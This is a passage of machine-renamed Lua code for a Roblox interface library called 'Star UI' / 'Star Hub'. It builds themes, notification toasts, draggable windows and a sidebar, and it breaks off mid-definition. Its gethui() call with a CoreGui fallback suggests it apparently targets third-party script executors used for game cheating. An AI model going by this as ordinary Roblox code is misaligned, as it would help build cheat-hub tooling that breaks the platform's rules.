		ink = color(12, 12, 14),
		inkRaised = color(22, 22, 26),
		inkLine = color(34, 34, 39),
		inkText = color(244, 244, 246),
		inkSub = color(138, 138, 146),
		inkDim = color(90, 90, 98),
		side = color(15, 15, 18),
		page = color(9, 9, 11),
		pageTop = color(13, 13, 16),
		pageBottom = color(6, 6, 8),
		card = color(17, 17, 20),
		cardLine = color(33, 33, 38),
		divider = color(26, 26, 30),
		field = color(24, 24, 28),
		hover = color(23, 23, 27),
		track = color(44, 44, 51),
		text = color(243, 243, 245),
		sub = color(142, 142, 151),
		dim = color(92, 92, 100),
		accent = color2,
		danger = color(239, 68, 68),
		tile = color(24, 24, 29),
	}

	local fontWeight = Enum.FontWeight

	local function func179(flag205)
		return Font.new("rbxasset://fonts/families/BuilderSans.json", flag205 or fontWeight.Regular)
	end

	local tbl91

	tbl91 = {
		Palette = tbl90,
		Theme = {
			Text = tbl90.text,
			Placeholder = tbl90.sub,
			Primary = tbl90.accent,
			Icon = tbl90.sub,
			ElementBackground = tbl90.field,
			Button = tbl90.cardLine,
			Outline = tbl90.cardLine,
			Background = tbl90.page,
			Accent = tbl90.card,
			Dialog = tbl90.card,
			ToggleBar = color2,
			Toggle = tbl90.accent,
			Tile = tbl90.tile,
		},
		Icon = function(obj34)
			if type(obj34) ~= "string" or obj34 == "" then
				return ""
			end

			if obj34:find("rbxasset") then
				return obj34
			end
			local entry20 = tbl89[obj34]
			return entry20 and "rbxassetid://" .. entry20 or ""
		end,
		Creator = { Icon = function(param134)
			local flag206 = tbl91.Icon(param134)
			if flag206 == "" then
				return nil
			end
			return { flag206, { ImageRectPosition = Vector2.zero, ImageRectSize = Vector2.zero } }
		end },
	}

	local function func180(param135, list34)
		local instance = Instance.new(param135)
		local value151 = nil

		for k, value152 in pairs(list34) do
			if k == "Parent" then
				value151 = value152
			else
				instance[k] = value152
			end
		end

		if instance:IsA("GuiObject") and list34.BorderSizePixel == nil then
			instance.BorderSizePixel = 0
		end

		if value151 then
			instance.Parent = value151
		end

		return instance
	end

	local function func181(param136, param137)
		return func180("UICorner", { CornerRadius = UDim.new(0, param137), Parent = param136 })
	end

	local function func182(param138, param139, flag207)
		return func180("UIStroke", {
			Color = param139,
			Transparency = flag207 or 0,
			Thickness = 1,
			ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
			Parent = param138,
		})
	end

	local function func183(param140, part20)
		local TextLabel = func180("TextLabel", {
			BackgroundTransparency = 1,
			FontFace = func179(part20.Weight),
			TextSize = part20.Size or 14,
			TextColor3 = part20.Color or tbl90.text,
			Text = part20.Text or "",
			TextXAlignment = part20.AlignX or Enum.TextXAlignment.Left,
			TextYAlignment = part20.AlignY or Enum.TextYAlignment.Center,
			TextTruncate = part20.Wrap and Enum.TextTruncate.None or Enum.TextTruncate.AtEnd,
			TextWrapped = part20.Wrap == true,
			AutoLocalize = false,
			Position = part20.Position or UDim2.new(),
			Size = part20.Box or UDim2.fromScale(1, 1),
			AnchorPoint = part20.Anchor or Vector2.zero,
			ZIndex = part20.Z or 1,
			Parent = param140,
		})

		if part20.AutoX then
			TextLabel.AutomaticSize = Enum.AutomaticSize.X
		end

		if part20.AutoY then
			TextLabel.AutomaticSize = Enum.AutomaticSize.Y
		end

		return TextLabel
	end

	local function func184(param141, param142, param143, flag208, flag209)
		local tbl92 = flag209 or {}

		return func180("ImageLabel", {
			BackgroundTransparency = 1,
			Image = tbl91.Icon(param142),
			ImageColor3 = flag208 or tbl90.sub,
			Size = UDim2.fromOffset(param143, param143),
			AnchorPoint = tbl92.Anchor or Vector2.new(0, 0.5),
			Position = tbl92.Position or UDim2.new(0, 0, 0.5, 0),
			ZIndex = tbl92.Z or 1,
			Parent = param141,
		})
	end

	local tbl93 = { Anchor = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5) }

	local function func185(param144, param145, param146)
		local tween = TweenService2:Create(param144, TweenInfo.new(param145, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), param146)
		tween:Play()
		return tween
	end

	local function func186(param147, ...)
		if type(param147) ~= "function" then
			return
		end
		local func187 = pcall
		local packed1 = table.pack(...)
		packed1.n = 2 + packed1.n - 1
		table.move(packed1, 1, packed1.n, 2, packed1)
		packed1[1] = param147
		local flag210, value153 = func187(table.unpack(packed1, 1, packed1.n))

		if not flag210 then
			warn("[Star UI] callback error: " .. tostring(value153))
		end
	end

	local function func188(input2)
		return input2.UserInputType == Enum.UserInputType.MouseButton1 or input2.UserInputType == Enum.UserInputType.Touch
	end

	local function func189(input3)
		return input3.UserInputType == Enum.UserInputType.MouseMovement or input3.UserInputType == Enum.UserInputType.Touch
	end

	local function func190(param148, callback3, callback4, callback5)
		local flag211 = false
		local value154 = nil

		local function func191()
			if not flag211 then
				return
			end
			flag211 = false

			if callback5 then
				callback5()
			end
		end

		param148.InputBegan:Connect(function(input)
			if not func188(input) then
				return
			end
			flag211 = true
			value154 = input

			if callback3 then
				callback3(input.Position)
			end

			local connection2 = nil

			connection2 = input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					connection2:Disconnect()
					func191()
				end
			end)
		end)

		local connection2 = UserInputService2.InputChanged:Connect(function(input)
			if not flag211 or not func189(input) then
				return
			end

			if value154.UserInputType == Enum.UserInputType.MouseButton1 and not UserInputService2:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) then
				func191()
				return
			end

			if input.UserInputType == Enum.UserInputType.Touch and input ~= value154 then
				return
			end

			if value154.UserInputType == Enum.UserInputType.Touch and input.UserInputType ~= Enum.UserInputType.Touch then
				return
			end
			callback4(input.Position)
		end)

		local connection3 = UserInputService2.InputEnded:Connect(function(input)
			if not (flag211 and value154) then
				return
			end

			if value154.UserInputType == Enum.UserInputType.Touch then
				if input == value154 then
					func191()
				end
			elseif input.UserInputType == value154.UserInputType then
				func191()
			end
		end)

		param148.Destroying:Connect(function()
			connection3:Disconnect()
		end)

		return connection2
	end

	local function func192()
		local ok, result = pcall(function()
			return gethui()
		end)

		if ok and result then
			return result
		end
		return game:GetService("CoreGui")
	end

	local function func193(childName4, param149)
		local obj35 = func192():FindFirstChild(childName4)

		if obj35 then
			obj35:Destroy()
		end

		return func180("ScreenGui", {
			Name = childName4,
			DisplayOrder = param149,
			ResetOnSpawn = false,
			IgnoreGuiInset = true,
			ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
			Parent = func192(),
		})
	end

	local robotoMono = Enum.Font.RobotoMono
	local n2 = game:GetService("TextService"):GetTextSize(string.rep("· ", 10), 100, robotoMono, Vector2.new(100000, 100000)).X / 1000

	local function func194(param150, flag212, num53, num54, num55, param151)
		local Frame = func180("Frame", {
			BackgroundTransparency = 1,
			Size = UDim2.fromScale(1, 1),
			ClipsDescendants = true,
			ZIndex = param151,
			Parent = param150,
		})

		local n3 = (flag212 == "tr" or flag212 == "br") and 1 or 0
		local n4 = (flag212 == "bl" or flag212 == "br") and 1 or 0

		if UserInputService2.TouchEnabled and not UserInputService2.KeyboardEnabled then
			num54 *= 1.4
			num53 *= 0.85
		end

		local n5 = num54 / n2

		for i = 0, math.floor(num53 / num54) do
			local n6 = i * num54
			local n7 = math.floor(math.sqrt(math.max(num53 * num53 - n6 * n6, 0)) / num54) + 1

			if 1 - n6 / num53 > 0.06 and n7 > 0 then
				local n8 = n7 * num54
				local list35 = {}

				for i2 = 0, 7 do
					local n9 = i2 / 7

					list35[#list35 + 1] = {
						n3 == 1 and 1 - n9 or n9,
						1 - num55 * math.max(1 - math.sqrt((n9 * n8) ^ 2 + n6 * n6) / num53, 0) ^ 1.3,
					}
				end

				table.sort(list35, function(tbl94, tbl95)
					return tbl94[1] < tbl95[1]
				end)

				local list36 = {}

				for _, item67 in ipairs(list35) do
					list36[#list36 + 1] = NumberSequenceKeypoint.new(item67[1], item67[2])
				end

				local n9 = 11 + n6 - num54 / 2

				local TextLabel = func180("TextLabel", {
					BackgroundTransparency = 1,
					Font = robotoMono,
					TextSize = n5,
					TextColor3 = color2,
					Text = string.rep("· ", n7),
					AutoLocalize = false,
					TextXAlignment = n3 == 1 and Enum.TextXAlignment.Right or Enum.TextXAlignment.Left,
					AnchorPoint = Vector2.new(n3, n4),
					Position = UDim2.new(n3, n3 == 1 and -6 or 6, n4, n4 == 1 and -n9 or n9),
					Size = UDim2.fromOffset(n8 + num54, num54),
					ZIndex = param151,
					Parent = Frame,
				})

				func180("UIGradient", { Transparency = NumberSequence.new(list36), Parent = TextLabel })
			end
		end

		return Frame
	end

	local function func195(num56, flag213)
		local str7 = tostring(flag213 or 1)
		local pos = str7:find("%.")
		local n3 = 0

		if pos then
			n3 = math.min(#str7 - pos, 3)
		end

		if n3 == 0 then
			return tostring(math.floor(num56 + 0.5))
		end
		return string.format("%." .. n3 .. "f", num56)
	end

	local Frame = nil
	local n3 = 0

	tbl91.Notify = function(self, flag214)
		local tbl96 = flag214 or {}

		if not (Frame and Frame.Parent) then
			local StarUI_Notify = func193("StarUI_Notify", 153)

			Frame = func180("Frame", {
				BackgroundTransparency = 1,
				AnchorPoint = Vector2.new(1, 1),
				Position = UDim2.new(1, -16, 1, -16),
				Size = UDim2.fromOffset(300, 480),
				Parent = StarUI_Notify,
			})

			func180("UIListLayout", {
				Padding = UDim.new(0, 8),
				VerticalAlignment = Enum.VerticalAlignment.Bottom,
				SortOrder = Enum.SortOrder.LayoutOrder,
				Parent = Frame,
			})
		end

		n3 += 1

		local Frame2 = func180("Frame", {
			BackgroundTransparency = 1,
			Size = UDim2.new(1, 0, 0, 0),
			AutomaticSize = Enum.AutomaticSize.Y,
			LayoutOrder = n3,
			Parent = Frame,
		})

		local Frame3 = func180("Frame", {
			BackgroundColor3 = tbl90.ink,
			Size = UDim2.new(1, 0, 0, 0),
			AutomaticSize = Enum.AutomaticSize.Y,
			Position = UDim2.fromOffset(330, 0),
			Parent = Frame2,
		})

		func181(Frame3, 12)
		func182(Frame3, tbl90.inkLine)

		func180("UIPadding", {
			PaddingTop = UDim.new(0, 12),
			PaddingBottom = UDim.new(0, 14),
			PaddingLeft = UDim.new(0, 12),
			PaddingRight = UDim.new(0, 14),
			Parent = Frame3,
		})

		local Frame4 = func180("Frame", { BackgroundColor3 = color2, Size = UDim2.fromOffset(32, 32), Parent = Frame3 })
		func181(Frame4, 16)
		func184(Frame4, tbl96.Icon or "info", 16, tbl90.ink, tbl93)

		local Frame5 = func180("Frame", {
			BackgroundTransparency = 1,
			Position = UDim2.fromOffset(44, 0),
			Size = UDim2.new(1, -44, 0, 0),
			AutomaticSize = Enum.AutomaticSize.Y,
			Parent = Frame3,
		})

		func180("UIListLayout", { Padding = UDim.new(0, 2), SortOrder = Enum.SortOrder.LayoutOrder, Parent = Frame5 })

		func183(Frame5, {
			Text = tostring(tbl96.Title or ""),
			Size = 15,
			Weight = fontWeight.Bold,
			Color = tbl90.inkText,
			Box = UDim2.new(1, 0, 0, 17),
		}).LayoutOrder = 1

		if tbl96.Content and tbl96.Content ~= "" then
			func183(Frame5, {
				Text = tostring(tbl96.Content),
				Size = 13,
				Color = tbl90.inkSub,
				Wrap = true,
				Box = UDim2.new(1, 0, 0, 0),
				AutoY = true,
				AlignY = Enum.TextYAlignment.Top,
			}).LayoutOrder = 2
		end

		local Frame6 = func180("Frame", {
			BackgroundColor3 = color2,
			BackgroundTransparency = 0.5,
			AnchorPoint = Vector2.new(0, 1),
			Position = UDim2.new(0, -12, 1, 14),
			Size = UDim2.new(1, 26, 0, 2),
			Parent = Frame3,
		})

		local n4 = tonumber(tbl96.Duration) or 3
		func185(Frame3, 0.35, { Position = UDim2.fromOffset(0, 0) })
		TweenService2:Create(Frame6, TweenInfo.new(n4, Enum.EasingStyle.Linear), { Size = UDim2.new(0, 0, 0, 2) }):Play()

		task.delay(n4, function()
			if not Frame2.Parent then
				return
			end
			func185(Frame3, 0.3, { Position = UDim2.fromOffset(330, 0) })
			task.wait(0.3)
			Frame2:Destroy()
		end)
	end

	tbl91.CreateWindow = function(self, flag215)
		local tbl97 = flag215 or {}
		local tbl98 = { Tabs = {}, Flags = {}, Opened = true }
		local size = tbl97.Size or UDim2.fromOffset(680, 500)
		local minSize = tbl97.MinSize or Vector2.new(520, 360)
		local sideBarWidth = tbl97.SideBarWidth or 200
		local StarUI = func193("StarUI", 150)
		local StarUI_Overlay = func193("StarUI_Overlay", 152)
		tbl98.Gui = StarUI
		tbl98.OverlayGui = StarUI_Overlay
		local tbl99 = {}

		local Frame2 = func180("Frame", {
			Name = "Window",
			AnchorPoint = Vector2.new(0.5, 0.5),
			Position = UDim2.fromScale(0.5, 0.5),
			Size = UDim2.fromOffset(size.X.Offset, size.Y.Offset),
			BackgroundColor3 = color2,
			Parent = StarUI,
		})

		func181(Frame2, 16)
		func180("UIGradient", { Rotation = 90, Color = ColorSequence.new(tbl90.pageTop, tbl90.pageBottom), Parent = Frame2 })
		local value155 = func182(Frame2, color2)
		func180("UIGradient", { Rotation = 90, Transparency = NumberSequence.new(0.78, 0.93), Parent = value155 })
		local UIScale = func180("UIScale", { Parent = Frame2 })

		local Frame3 = func180("Frame", {
			BackgroundColor3 = tbl90.page,
			BackgroundTransparency = 1,
			Size = UDim2.fromScale(1, 1),
			ZIndex = 50,
			Visible = false,
			Parent = Frame2,
		})

		func181(Frame3, 16)
		local position = Frame2.Position
		local n4 = 0
		tbl98.Root = Frame2

		local function func196()
			local currentCamera = workspace.CurrentCamera
			currentCamera = currentCamera and currentCamera.ViewportSize or Vector2.new(1920, 1080)
			return math.clamp(math.min((currentCamera.X - 24) / Frame2.Size.X.Offset, (currentCamera.Y - 24) / Frame2.Size.Y.Offset), 0.45, 1)
		end

		local flag216 = false

		local function func197()
			local currentCamera = workspace.CurrentCamera
			local viewportSize = currentCamera and currentCamera.ViewportSize or Vector2.new(1920, 1080)
			return UDim2.fromOffset(math.max(minSize.X, viewportSize.X - 24), math.max(minSize.Y, viewportSize.Y - 24))
		end

		local function func198()
			if flag216 then
				Frame2.Size = func197()
			end

			UIScale.Scale = func196()
		end

		task.defer(func198)

		if workspace.CurrentCamera then
			table.insert(tbl99, workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(func198))
		end

		local Frame4 = func180("Frame", { Name = "Sidebar", BackgroundColor3 = tbl90.side, Size = UDim2.new(0, sideBarWidth, 1, 0), Parent = Frame2 })
		func181(Frame4, 16)

		func180("Frame", {
			BackgroundColor3 = tbl90.side,
			AnchorPoint = Vector2.new(1, 0),
			Position = UDim2.new(1, 0, 0, 0),
			Size = UDim2.new(0, 16, 1, 0),
			Parent = Frame4,
		})

		func180("Frame", {
			BackgroundColor3 = tbl90.cardLine,
			AnchorPoint = Vector2.new(1, 0),
			Position = UDim2.new(1, 0, 0, 0),
			Size = UDim2.new(0, 1, 1, 0),
			ZIndex = 2,
			Parent = Frame4,
		})

		func194(Frame4, "tl", 250, 13, 0.2, 1)

		local Frame5 = func180("Frame", {
			BackgroundTransparency = 1,
			Active = true,
			Size = UDim2.new(1, 0, 0, 70),
			ZIndex = 2,
			Parent = Frame4,
		})

		local Frame6 = func180("Frame", {
			BackgroundColor3 = color2,
			AnchorPoint = Vector2.new(0, 1),
			Position = UDim2.new(0, 14, 1, 0),
			Size = UDim2.new(1, -28, 0, 1),
			ZIndex = 2,
			Parent = Frame5,
		})

		local func199 = func180
		local tbl100 = {}
		local numberSequence = NumberSequence.new
		local value156 = NumberSequenceKeypoint.new(0, 1)
		local value157 = NumberSequenceKeypoint.new(0.3, 0.8)
		local value158 = NumberSequenceKeypoint.new(0.7, 0.8)
		local new = NumberSequenceKeypoint.new
		local tbl101 = { value156, value157, value158 }

		do
			local values = table.pack(new(1, 1))
			table.move(values, 1, values.n, 4, tbl101)
		end

		tbl100.Transparency = numberSequence(tbl101)
		tbl100.Parent = Frame6
		func199("UIGradient", tbl100)

		local Frame7 = func180("Frame", {
			BackgroundColor3 = color2,
			AnchorPoint = Vector2.new(0, 0.5),
			Position = UDim2.new(0, 16, 0.5, 0),
			Size = UDim2.fromOffset(36, 36),
			ZIndex = 2,
			Parent = Frame5,
		})

		func181(Frame7, 11)

		if tbl97.Logo then
			Frame7.BackgroundTransparency = 1

			func180("ImageLabel", {
				BackgroundTransparency = 1,
				Image = tbl97.Logo,
				ScaleType = Enum.ScaleType.Fit,
				AnchorPoint = Vector2.new(0.5, 0.5),
				Position = UDim2.fromScale(0.5, 0.5),
				Size = UDim2.fromOffset(38, 38),
				ZIndex = 3,
				Parent = Frame7,
			})
		else
			func184(Frame7, tbl97.Icon or "star", 18, tbl90.ink, { Anchor = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5), Z = 2 })
		end

		local Frame8 = func180("Frame", {
			BackgroundTransparency = 1,
			Position = UDim2.fromOffset(62, 16),
			Size = UDim2.new(1, -70, 0, 20),
			ZIndex = 2,
			Parent = Frame5,
		})

		func180("UIListLayout", {
			FillDirection = Enum.FillDirection.Horizontal,
			VerticalAlignment = Enum.VerticalAlignment.Center,
			Padding = UDim.new(0, 6),
			SortOrder = Enum.SortOrder.LayoutOrder,
			Parent = Frame8,
		})

		func183(Frame8, {
			Text = tbl97.Title or "Star Hub",
			Size = 17,
			Weight = fontWeight.Bold,
			Color = tbl90.inkText,
			Box = UDim2.fromOffset(0, 20),
			AutoX = true,
			Z = 2,
		}).LayoutOrder = 1

		local value159 = func183(Frame5, {
			Text = "",
			Size = 12,
			Weight = fontWeight.Medium,
			Color = tbl90.inkSub,
			Position = UDim2.fromOffset(62, 38),
			Box = UDim2.new(1, -70, 0, 15),
			Z = 2,
		})

		value159.RichText = true

		local Frame9 = func180("Frame", {
			BackgroundColor3 = tbl90.inkRaised,
			Position = UDim2.fromOffset(12, 76),
			Size = UDim2.new(1, -24, 0, 34),
			ZIndex = 2,
			Parent = Frame4,
		})

		func181(Frame9, 10)
		local value160 = func182(Frame9, tbl90.inkLine)
		func184(Frame9, "search", 15, tbl90.inkSub, { Position = UDim2.new(0, 10, 0.5, 0), Z = 2 })

		local TextBox = func180("TextBox", {
			BackgroundTransparency = 1,
			Position = UDim2.fromOffset(32, 0),
			Size = UDim2.new(1, -62, 1, 0),
			ClearTextOnFocus = false,
			Text = "",
			PlaceholderText = "Search settings",
			PlaceholderColor3 = tbl90.inkDim,
			FontFace = func179(fontWeight.Medium),
			TextSize = 14,
			TextColor3 = tbl90.inkText,
			TextXAlignment = Enum.TextXAlignment.Left,
			TextTruncate = Enum.TextTruncate.AtEnd,
			ZIndex = 2,
			Parent = Frame9,
		})

		local TextButton = func180("TextButton", {
			Text = "",
			AutoButtonColor = false,
			BackgroundColor3 = tbl90.inkLine,
			AnchorPoint = Vector2.new(1, 0.5),
			Position = UDim2.new(1, -7, 0.5, 0),
			Size = UDim2.fromOffset(20, 20),
			Visible = false,
			ZIndex = 2,
			Parent = Frame9,
		})

		func181(TextButton, 10)
		func184(TextButton, "x", 12, tbl90.inkText, { Anchor = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5), Z = 2 })

		TextButton.Activated:Connect(function()
			TextBox.Text = ""
		end)

		TextBox.Focused:Connect(function()
			func185(value160, 0.15, { Color = tbl90.inkSub })
		end)

		TextBox.FocusLost:Connect(function()
			func185(value160, 0.15, { Color = tbl90.inkLine })
		end)

		local ScrollingFrame = func180("ScrollingFrame", {
			BackgroundTransparency = 1,
			Position = UDim2.fromOffset(0, 116),
			Size = UDim2.new(1, 0, 1, -188),
			CanvasSize = UDim2.new(),
			AutomaticCanvasSize = Enum.AutomaticSize.Y,
			ScrollBarThickness = 0,
			ScrollingDirection = Enum.ScrollingDirection.Y,
			ZIndex = 2,
			Parent = Frame4,
		})

		func180("UIPadding", {
			PaddingTop = UDim.new(0, 4),
			PaddingBottom = UDim.new(0, 10),
			PaddingLeft = UDim.new(0, 12),
			PaddingRight = UDim.new(0, 12),
			Parent = ScrollingFrame,
		})

		func180("UIListLayout", { Padding = UDim.new(0, 3), SortOrder = Enum.SortOrder.LayoutOrder, Parent = ScrollingFrame })
		local n5 = 0

		local function func200()
			n5 += 1
			return n5
		end

		local Frame10 = func180("Frame", {
			BackgroundColor3 = tbl90.inkRaised,
			AnchorPoint = Vector2.new(0, 1),
			Position = UDim2.new(0, 12, 1, -12),
			Size = UDim2.new(1, -24, 0, 54),
			ZIndex = 2,
			Parent = Frame4,
		})

		func181(Frame10, 12)
		func182(Frame10, tbl90.inkLine)

		local ImageLabel = func180("ImageLabel", {
			BackgroundColor3 = tbl90.inkLine,
			AnchorPoint = Vector2.new(0, 0.5),
			Position = UDim2.new(0, 10, 0.5, 0),
			Size = UDim2.fromOffset(34, 34),
			ZIndex = 2,
			Parent = Frame10,
		})

		func181(ImageLabel, 17)
		func182(ImageLabel, color2, 0.6)

		local Frame11 = func180("Frame", {
			BackgroundColor3 = color(34, 197, 94),
			AnchorPoint = Vector2.new(1, 1),
			Position = UDim2.new(1, 1, 1, 1),
			Size = UDim2.fromOffset(10, 10),
			ZIndex = 3,
			Parent = ImageLabel,
		})

		func181(Frame11, 5)
		func182(Frame11, tbl90.inkRaised).Thickness = 2

		local value161 = func183(Frame10, {
			Size = 14,
			Weight = fontWeight.SemiBold,
			Color = tbl90.inkText,
			Position = UDim2.fromOffset(54, 10),
			Box = UDim2.new(1, -62, 0, 17),
			Z = 2,
		})

		local value162 = func183(Frame10, {
			Size = 12,
			Color = tbl90.inkSub,
			Position = UDim2.fromOffset(54, 27),
			Box = UDim2.new(1, -62, 0, 15),
			Z = 2,
		})

		tbl98.User = {}

		tbl98.User.SetAnonymous = function(param152, flag217)
			local anonymous = flag217 == true
			param152.Anonymous = anonymous
			ImageLabel.Image = "rbxthumb://type=AvatarHeadShot&id=" .. (anonymous and 1 or localPlayer2.UserId) .. "&w=150&h=150"
			value161.Text = anonymous and "Anonymous" or localPlayer2.DisplayName
			value162.Text = anonymous and "@anonymous" or "@" .. localPlayer2.Name
		end

		tbl98.User:SetAnonymous(tbl97.User and tbl97.User.Anonymous)
		Frame10.Visible = not (tbl97.User and tbl97.User.Enabled == false)

		local Frame12 = func180("Frame", {
			Name = "Content",
			BackgroundTransparency = 1,
			Position = UDim2.fromOffset(sideBarWidth, 0),
			Size = UDim2.new(1, -sideBarWidth, 1, 0),
			ClipsDescendants = true,
			Parent = Frame2,
		})

		func194(Frame12, "tr", 330, 14, 0.18, 0)
		func194(Frame12, "bl", 230, 14, 0.13, 0)
		local Frame13 = func180("Frame", { BackgroundColor3 = color2, Size = UDim2.new(1, 0, 0, 160), Parent = Frame12 })
		func180("UIGradient", { Rotation = 90, Transparency = NumberSequence.new(0.965, 1), Parent = Frame13 })
		local Frame14 = func180("Frame", { BackgroundTransparency = 1, Active = true, Size = UDim2.new(1, 0, 0, 64), Parent = Frame12 })

		local Frame15 = func180("Frame", {
			BackgroundColor3 = color2,
			Position = UDim2.fromOffset(22, 13),
			Size = UDim2.fromOffset(38, 38),
			Parent = Frame14,
		})

		func181(Frame15, 11)
		local UIScale2 = func180("UIScale", { Parent = Frame15 })
		local value163 = func184(Frame15, "house", 18, tbl90.ink, tbl93)

		local value164 = func183(Frame14, {
			Size = 11,
			Weight = fontWeight.Bold,
			Color = tbl90.dim,
			Position = UDim2.fromOffset(72, 14),
			Box = UDim2.new(1, -170, 0, 13),
		})

		local value165 = func183(Frame14, {
			Size = 22,
			Weight = fontWeight.Bold,
			Color = tbl90.text,
			Position = UDim2.fromOffset(72, 27),
			Box = UDim2.new(1, -170, 0, 26),
		})

		local Frame16 = func180("Frame", {
			BackgroundTransparency = 1,
			AnchorPoint = Vector2.new(1, 0),
			Position = UDim2.new(1, -16, 0, 16),
			Size = UDim2.fromOffset(110, 30),
			Parent = Frame14,
		})

		func180("UIListLayout", {
			FillDirection = Enum.FillDirection.Horizontal,
			HorizontalAlignment = Enum.HorizontalAlignment.Right,
			Padding = UDim.new(0, 6),
			SortOrder = Enum.SortOrder.LayoutOrder,
			Parent = Frame16,
		})

		local function func201(param153, param154, param155)
			local TextButton2 = func180("TextButton", {
				Text = "",
				AutoButtonColor = false,
				BackgroundColor3 = tbl90.field,
				Size = UDim2.fromOffset(30, 30),
				LayoutOrder = param154,
				Parent = Frame16,
			})

			func181(TextButton2, 15)
			local value166 = func182(TextButton2, tbl90.cardLine)
			local value167 = func184(TextButton2, param153, 15, tbl90.sub, tbl93)

			TextButton2.MouseEnter:Connect(function()
				func185(TextButton2, 0.15, { BackgroundColor3 = color2 })
				func185(value167, 0.15, { ImageColor3 = tbl90.ink })
				func185(value166, 0.15, { Color = color2 })
			end)

			TextButton2.MouseLeave:Connect(function()
				func185(TextButton2, 0.15, { BackgroundColor3 = tbl90.field })
				func185(value167, 0.15, { ImageColor3 = tbl90.sub })
				func185(value166, 0.15, { Color = tbl90.cardLine })
			end)

			TextButton2.Activated:Connect(param155)
			return TextButton2
		end

		local Frame17 = func180("Frame", {
			BackgroundTransparency = 1,
			Position = UDim2.fromOffset(0, 64),
			Size = UDim2.new(1, 0, 1, -64),
			Parent = Frame12,
		})

		local Frame18 = func180("Frame", {
			BackgroundColor3 = tbl90.pageTop,
			Position = UDim2.fromOffset(0, 64),
			Size = UDim2.new(1, 0, 0, 18),
			ZIndex = 5,
			Parent = Frame12,
		})

		func180("UIGradient", { Rotation = 90, Transparency = NumberSequence.new(0, 1), Parent = Frame18 })

		local Frame19 = func180("Frame", {
			BackgroundColor3 = tbl90.pageTop,
			BackgroundTransparency = 1,
			Size = UDim2.fromScale(1, 1),
			ZIndex = 6,
			Parent = Frame17,
		})

		local ScrollingFrame2 = func180("ScrollingFrame", {
			BackgroundTransparency = 1,
			Size = UDim2.fromScale(1, 1),
			Visible = false,
			CanvasSize = UDim2.new(),
			AutomaticCanvasSize = Enum.AutomaticSize.Y,
			ScrollBarThickness = 3,
			ScrollBarImageColor3 = tbl90.dim,
			ScrollingDirection = Enum.ScrollingDirection.Y,
			Parent = Frame17,
		})

		func180("UIPadding", {
			PaddingTop = UDim.new(0, 4),
			PaddingBottom = UDim.new(0, 22),
			PaddingLeft = UDim.new(0, 22),
			PaddingRight = UDim.new(0, 22),
			Parent = ScrollingFrame2,
		})

		func180("UIListLayout", { Padding = UDim.new(0, 8), SortOrder = Enum.SortOrder.LayoutOrder, Parent = ScrollingFrame2 })
		local list37 = {}

		local TextButton2 = func180("TextButton", {
			Text = "",
			AutoButtonColor = false,
			BackgroundTransparency = 1,
			AnchorPoint = Vector2.new(1, 1),
			Position = UDim2.new(1, 0, 1, 0),
			Size = UDim2.fromOffset(18, 18),
			ZIndex = 20,
			Parent = Frame2,
		})

		for i = 0, 1 do
			func180("Frame", {
				BackgroundColor3 = tbl90.dim,
				AnchorPoint = Vector2.new(1, 1),
				Rotation = -45,
				Position = UDim2.new(1, -4 - i * 4, 1, -5),
				Size = UDim2.fromOffset(8 - i * 4, 1),
				ZIndex = 20,
				Parent = TextButton2,
			})
		end

		local position2 = nil
		local value168 = nil

		local function func202(param156)
			position2 = Frame2.Position
			value168 = param156
		end

		local function func203(num57)
			local n6 = num57 - value168
			Frame2.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n6.X, position2.Y.Scale, position2.Y.Offset + n6.Y)
			position = Frame2.Position
		end

		table.insert(tbl99, func190(Frame5, func202, func203))
		table.insert(tbl99, func190(Frame14, func202, func203))
		local size2 = nil
		local value169 = nil
		local value170 = nil

		table.insert(tbl99, func190(TextButton2, function(param157)
			local position3 = Frame2.Position
			size2 = Frame2.Size
			value169 = param157
			value170 = position3
		end, function(num58)
			local n6 = (num58 - value169) / UIScale.Scale
			local n7 = math.max(minSize.X, size2.X.Offset + n6.X)
			local n8 = math.max(minSize.Y, size2.Y.Offset + n6.Y)
			local scale = UIScale.Scale
			local n9 = Vector2.new(n7 - size2.X.Offset, n8 - size2.Y.Offset) * scale / 2
			Frame2.Size = UDim2.fromOffset(n7, n8)
			Frame2.Position = UDim2.new(value170.X.Scale, value170.X.Offset + n9.X, value170.Y.Scale, value170.Y.Offset + n9.Y)
			position = Frame2.Position
		end))

		local StarUI_Toggle = func193("StarUI_Toggle", 155)
		tbl98.ToggleGui = StarUI_Toggle

		local Frame20 = func180("Frame", {
			BackgroundTransparency = 1,
			Position = UDim2.new(0, 282, 0, 8),
			Size = UDim2.fromOffset(0, 50),
			AutomaticSize = Enum.AutomaticSize.X,
			Visible = not (tbl97.OpenButton and tbl97.OpenButton.Enabled == false),
			Parent = StarUI_Toggle,
		})

		local TextButton3 = func180("TextButton", {
			Text = "",
			AutoButtonColor = false,
			BackgroundColor3 = color2,
			ClipsDescendants = true,
			Size = UDim2.fromOffset(0, 50),
			AutomaticSize = Enum.AutomaticSize.X,
			ZIndex = 2,
			Parent = Frame20,
		})

		func181(TextButton3, 25)
		func180("UIGradient", { Rotation = 90, Color = ColorSequence.new(color(30, 30, 37), color(9, 9, 12)), Parent = TextButton3 })
		local value171 = func182(TextButton3, color2)
		value171.Thickness = 1.5
		local func204 = func180
		local tbl102 = {}
		local numberSequence2 = NumberSequence.new
		local value172 = NumberSequenceKeypoint.new(0, 0.3)
		local value173 = NumberSequenceKeypoint.new(0.3, 0.88)
		local value174 = NumberSequenceKeypoint.new(0.7, 0.88)
		local new2 = NumberSequenceKeypoint.new
		local tbl103 = { value172, value173, value174 }

		do
			local values = table.pack(new2(1, 0.3))
			table.move(values, 1, values.n, 4, tbl103)
		end

		tbl102.Transparency = numberSequence2(tbl103)
		tbl102.Parent = value171
		local UIGradient = func204("UIGradient", tbl102)

		local Frame21 = func180("Frame", {
			BackgroundColor3 = color2,
			AnchorPoint = Vector2.new(0.5, 0),
			Position = UDim2.new(0.5, 0, 0, 1),
			Size = UDim2.new(1, -44, 0, 1),
			ZIndex = 3,
			Parent = TextButton3,
		})

